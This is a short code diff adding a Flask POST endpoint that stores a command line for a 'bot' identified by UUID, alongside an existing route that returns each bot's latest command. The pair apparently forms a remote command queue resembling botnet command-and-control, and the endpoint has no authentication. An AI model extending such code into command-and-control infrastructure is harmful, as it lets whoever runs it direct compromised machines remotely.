@@ -96,3 +96,28 @@ def get_command(uuid):
 	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
 
 	return cmd_schema.jsonify(cmd)
+
+
+@bots.route("/api/bot/<uuid>/command", methods=["POST"])
+def push_command(uuid):
+
+	success_code = 0
+
+	requests_data = request.get_json()
+
+	cmd = Command(bot_uuid=uuid, line=requests_data["line"])
+
+	try: 
+
+		database.session.add(cmd)
+		database.session.commit()
+
+		success_code = 1
+
+	except Exception:
+
+		database.session.rollback()
+
+	finally:
+
+		return { "success": success_code }
